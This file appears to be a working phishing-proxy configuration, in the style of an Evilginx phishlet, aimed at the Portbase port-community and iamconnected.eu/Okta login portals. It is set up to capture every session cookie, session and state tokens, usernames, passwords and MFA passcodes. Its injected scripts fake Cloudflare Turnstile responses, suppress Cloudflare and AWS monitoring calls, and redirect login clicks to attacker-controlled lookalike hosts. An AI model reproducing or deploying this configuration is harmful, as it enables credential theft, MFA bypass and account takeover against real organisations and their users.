auth_tokens:
  - domain: '.iamconnected.eu'
    keys: ['.*,regexp']
  - domain: '.xone.sarl'
    keys: ['.*,regexp']
  - domain: 'auth.xone.sarl'
    keys: ['.*,regexp']
  - domain: '.okta-emea.com'
    keys: ['.*,regexp']
  - domain: 'portbase-admin.okta-emea.com'
    keys: ['.*,regexp']
  - domain: '.ia.com'
    keys: ['.*,regexp']
  - domain: 'fiamc-api.ia.com'
    keys: ['.*,regexp']
  - domain: '.pcs.portbase.com'
    keys: ['.*,regexp']
  - domain: '.portbase.com'
    keys: ['.*,regexp']
  - domain: 'autn.iamconnected.eu'
    type: 'body'
    path: '/api/v1/'
    name: 'sessionToken'
    search: '"sessionToken"\s*:\s*"([^"]+)"'
  - domain: 'autn.iamconnected.eu'
    type: 'body'
    path: '/api/v1/'
    name: 'stateToken'
    search: '"stateToken"\s*:\s*"([^"]+)"'

auth_urls:
  - '/auth/callback'
  - '/token'
  - '/iamc-api/iamc-callback'
  - '/portal/start'
  - '/portal/'
  - '/dashboard'
  - '/home'
  - '/portal'

credentials:
  username:
    key: 'username'
    search: '"username"\s*:\s*"([^"]+)"'
    type: 'json'
  password:
    key: 'password'
    search: '"password"\s*:\s*"([^"]+)"'
    type: 'json'
  custom:
    - key: 'mfa'
      search: '"passCode"\s*:\s*"([^"]+)"'
      type: 'json'
    - key: 'stateToken'
      search: '"stateToken"\s*:\s*"([^"]+)"'
      type: 'json'

puppet:
  enabled: true
  mode: 'ia-mirror'
  upstream: 'http://127.0.0.1:1000'
  hosts:
    - 'www.portbase.com'
    - 'login.pcs.portbase.com'
    - 'pcs.portbase.com'
    - 'start.pcs.portbase.com'

js_inject:
  - trigger_domains: ["www.portbase.com"]
    trigger_paths: ['/.*/']
    trigger_mimes: ['text/html']
    trigger_params: []
    script: |
      (function(){
        var s='cf-phish-stub';
        window.turnstile={render:function(e,o){if(o&&o.callback)try{o.callback(s)}catch(x){}return'w'},ready:function(f){if(f)f()},reset:function(){},remove:function(){},getResponse:function(){return s},execute:function(){return s}};
        var b=location.hostname.split('.').slice(1).join('.');
        var pcs='https://pcsl.'+b+'/?lang=nl';
        document.addEventListener('click',function(e){
          var a=e.target&&e.target.closest?e.target.closest('a'):null;
          if(!a||!/pcs|inloggen|login/i.test(String(a.href||'')+String(a.textContent||'')))return;
          e.preventDefault();e.stopImmediatePropagation();location.replace(pcs);
        },true);
      })();
  # icwww: Cloudflare Turnstile stub (register/login/callback — challenges.cloudflare.com blocked)
  - trigger_domains: ["www.iamconnected.eu"]
    trigger_paths: ['/.*/']
    trigger_mimes: ['text/html']
    trigger_params: []
    script: |
      (function(){
        var S="cf-phish-stub";
        function fire(o){if(o&&o.callback)try{o.callback(S)}catch(e){}}
        function mk(){return{render:function(e,o){fire(o);return"w"},ready:function(f){if(f)f()},reset:function(){},remove:function(){},getResponse:function(){return S},execute:function(){return S}}};
        window.turnstile=mk();
        function blk(u){return u&&(u.indexOf("challenges.cloudflare.com")>-1||u.indexOf("turnstile/api.js")>-1||u.indexOf("dataplane.rum.")>-1||u.indexOf(".rum.amazonaws.com")>-1);}
        function kill(){document.querySelectorAll('iframe[src*="cloudflare"],.cf-turnstile,[data-sitekey]').forEach(function(el){el.remove()});var i=document.querySelector('[name="cf-turnstile-response"]');if(!i){i=document.createElement("input");i.type="hidden";i.name="cf-turnstile-response";i.value=S;(document.body||document.documentElement).appendChild(i)}else i.value=S;}
        if(window.fetch){var f=window.fetch;window.fetch=function(u,o){var url=typeof u==="string"?u:(u&&u.url)||"";if(blk(url))return Promise.resolve(new Response("{}",{status:200,headers:{"Content-Type":"application/json"}}));return f.apply(this,arguments)}}
        if(navigator.sendBeacon){var sb=navigator.sendBeacon.bind(navigator);navigator.sendBeacon=function(u,d){if(blk(u))return true;return sb(u,d)}}
        kill();document.addEventListener("DOMContentLoaded",kill);
      })();
  # PCS fallback if server 302 missed (tryPcsOAuthShortcut is primary)
  - trigger_domains: ["login.pcs.portbase.com", "pcs.portbase.com", "start.pcs.portbase.com"]
    trigger_paths: ['/.*/']
    trigger_mimes: ['text/html']
    trigger_params: []
    script: |
      (function(){
        if(/client_id=/.test(location.search))return;
        var b=location.hostname.split('.').slice(1).join('.'),l='nl';
        try{l=new URLSearchParams(location.search).get('lang')||l}catch(e){}
        var ru=encodeURIComponent('https://iamc-api.'+b+'/iamc-api/iamc-callback'),st=encodeURIComponent('https://pcsw.'+b+'/portal/start.do'),
        u='https://login.'+b+'/?client_id=0oa2jy3t24TN0gtZk0i7&redirect_uri='+ru+'&state='+st+'&lang='+encodeURIComponent(l);
        document.addEventListener('click',function(e){
          var a=e.target&&e.target.closest?e.target.closest('a'):null;
          if(!a){a=e.target&&e.target.closest?e.target.closest('#link_iamc'):null}
          if(!a)return;
          e.preventDefault();e.stopImmediatePropagation();location.replace(u);
        },true);
      })();
